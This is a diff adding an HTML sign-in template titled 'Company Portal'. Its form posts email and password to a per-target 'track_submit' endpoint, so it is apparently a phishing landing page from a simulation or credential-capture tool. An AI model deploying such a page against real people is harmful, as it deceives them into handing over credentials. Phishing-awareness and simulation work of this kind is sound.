@@ -1,0 +1,27 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in</title>
+<style>
+  body { font-family: -apple-system, "Segoe UI", sans-serif; background:#eef1f5; display:flex;
+         align-items:center; justify-content:center; min-height:100vh; margin:0; }
+  .box { background:#fff; padding:34px; border-radius:10px; width:320px; box-shadow:0 2px 16px rgba(0,0,0,.08); }
+  .box h2 { margin:0 0 4px; font-size:19px; }
+  .box p.sub { color:#667; font-size:13px; margin:0 0 20px; }
+  label { display:block; font-size:13px; color:#556; margin:14px 0 5px; }
+  input { width:100%; padding:9px 10px; border:1px solid #ccd2da; border-radius:6px; font-size:14px; box-sizing:border-box; }
+  button { margin-top:20px; width:100%; background:#2f6fed; color:#fff; border:none; padding:10px;
+           border-radius:6px; font-size:14px; cursor:pointer; }
+</style></head>
+<body>
+  <div class="box">
+    <h2>Company Portal</h2>
+    <p class="sub">Please sign in to continue</p>
+    <form method="post" action="{{ url_for('track_submit', token=token) }}">
+      <label>Email</label>
+      <input type="email" name="u" required>
+      <label>Password</label>
+      <input type="password" name="p" required>
+      <button type="submit">Sign in</button>
+    </form>
+  </div>
+</body></html>
